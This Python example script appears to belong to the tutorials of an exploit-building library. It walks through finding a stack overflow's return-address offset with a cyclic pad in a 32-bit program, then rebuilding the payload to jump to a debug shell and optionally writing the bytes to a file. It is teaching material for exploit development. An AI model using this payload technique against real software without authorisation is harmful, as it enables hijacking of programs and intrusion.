# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""cento -- borrowed fragments, arranged deliberately, checked as a whole.

Example 1 -- find your offset

The classic first exercise, deliberately mundane. mkcfg -- the desktop configurator for the
Meridian MK-1, plain 32-bit x86 -- copies a config string into a 64-byte stack buffer with no
bounds check; past the buffer sit the three words its epilogue pops (saved ebx, saved ebp, the
return address). This is the pwntools cycle workflow, cento-flavored:

    pwntools                                 cento
    payload = cyclic(0x4c)                   frame = cento.region("frame", max_size=0x4C, pad=4, endian="little")
    cyclic_find(0x61616173)                  cento.cycle_find(0x61616173, endian="little")
    flat({0x48: p32(win)}, length=0x4c)      frame[0x48] = win
    flat(p64(a), p64(b), p64(c))             cento.fit([a, b, c])
    fit({0x88: p64(win)}, length=0xa8)       cento.fit({0x88: win}, length=0xA8)

Same three moves (the two fit rows are alternate spellings of one). The difference: the offset
ends up a named place (frame.pops.ret, in the closing beat), not a magic number. Teaches regions, pads, views, emit, and cycle/cycle_find.

Run: python3 examples/ex01/ex01_find_your_offset.py                      # the whole story, simulated
     ... --crash 0x61616173                                         # your real crash value -> its offset
     ... --crash 0x61616173 --address 0x080491e2                    # + rebuild with the ret you want
     ... --crash 0x61616173 --address 0x080491e2 --out payload.bin  # and write the bytes for piping
Next: ex02_toy_chain
"""

import argparse
import pathlib
import sys

import cento


class SavedRegs(cento.View, size=0xC):
    """What mkcfg's epilogue pops on the way out (lea esp, [ebp-4]; pop ebx; pop ebp; ret), in stack order."""

    ebx: cento.u32
    ebp: cento.u32
    ret: cento.u32  # the return address: it lands in eip, which is what the segfault report shows


def build_frame(frame_size: int, patch: tuple[int, int] | None = None) -> cento.Region:
    """One overflow image: a region cycle-padded at creation, with an optional (offset, word) patch."""
    frame = cento.region("frame", max_size=frame_size, pad=4, endian="little")
    if patch is not None:
        offset, word = patch
        frame[offset] = word  # the patch rides on top of the pad: same cell, last write wins
    return frame


def locate(crash: int, address: int | None, frame_size: int, out: str | None) -> int | None:
    """Real-crash mode: convert the eip your crash reported into its pad offset (None if it is not in the pad)."""
    try:
        offset = cento.cycle_find(crash, endian="little")
    except ValueError:
        print(f"failed to locate cycle value {crash:#x}")  # e.g. not aligned, wrong endianness, or not from the pad
        return None
    print(f"cycle_find({crash:#x}) -> offset {offset} (0x{offset:x}) = the return-address slot")
    if address is not None:
        frame = build_frame(frame_size, patch=(offset, address))
        image = frame.image()  # this region's emitted bytes, fail-closed (bytes(frame) says the same)
        print(frame.layout.hexdump(skip=True))
        print(f"image ({len(image)} bytes): {image.hex()}")
        print(f"working ret: +0x{offset:x} now holds {address:#010x}")
        if out is not None:
            pathlib.Path(out).write_bytes(image)
            print(f"wrote {len(image)} bytes to {out}")
    return offset


def demo() -> bool:
    buf_len, saved_len = 0x40, 0xC  # the 64-byte stack buffer we own + the three words the epilogue pops
    win = 0x080491E2  # mkcfg's forgotten debug shell -- e2 91 04 08: NUL-free, like the pad's lowercase bytes, so it survives the string copy

    padded = build_frame(buf_len + saved_len)
    print(f"step 1: overflow buffer and saved words with a self-locating pad, then run it\n{padded.layout.hexdump(skip=True)}")
    observed_eip = 0x61616173  # what the fuzz run's segfault report showed in eip
    print(f"crash! segfault at eip={observed_eip:#010x}")

    print("\nstep 2: ask the pad which offset those 4 bytes came from")
    offset = cento.cycle_find(observed_eip, endian="little")
    print(f"cycle_find({observed_eip:#x}) -> offset {offset} (0x{offset:x}) = the return-address slot")

    aimed = build_frame(buf_len + saved_len, patch=(offset, win))
    print(f"\nstep 3: rebuild with the ret we want ({win:#x}) at offset 0x{offset:x}\n{aimed.layout.hexdump(skip=True)}")
    print(f"the next run lands at eip={win:#010x}")

    # The cento close: the slot has a name. SavedRegs is what the epilogue pops; place it once on
    # a fresh frame and the ret row reads frame.pops.ret, not raw+0x48.
    named = cento.region("frame", max_size=buf_len + saved_len, fill="a", endian="little")
    pops = named.at(buf_len, SavedRegs, "pops")
    pops.ret = win  # ebx and ebp stay fill: the debug shell does not care what the epilogue pops into them
    print(f"\nsame aim, by name\n{named.layout.hexdump(skip=True)}")
    print("check out example 2 to start building real payloads")
    return True


def autoint(text: str) -> int:
    return int(text, 0)


def main(argv: list[str] | None = None) -> bool:
    parser = argparse.ArgumentParser(prog="python3 examples/ex01/ex01_find_your_offset.py", description="find-your-offset: no args runs the simulated story")
    parser.add_argument("--crash", type=autoint, help="the eip value your crash reported after a cycle pad ran; prints the offset it names")
    parser.add_argument("--address", type=autoint, help="with --crash: rebuild the pad with this working ret at the located offset")
    parser.add_argument("--length", type=autoint, default=0x4C, help="pad length for the --address rebuild (default 0x4c)")
    parser.add_argument("--out", help="with --crash and --address: write the rebuilt image to this file")
    args = parser.parse_args(argv)
    if args.address is not None and args.crash is None:
        parser.error("--address requires --crash (nothing to locate yet)")
    if args.out is not None and args.address is None:
        parser.error("--out requires --crash and --address (nothing to write yet)")
    if args.crash is not None:
        return locate(args.crash, args.address, args.length, args.out) is not None
    return demo()


if __name__ == "__main__":
    if not main():
        sys.exit(1)
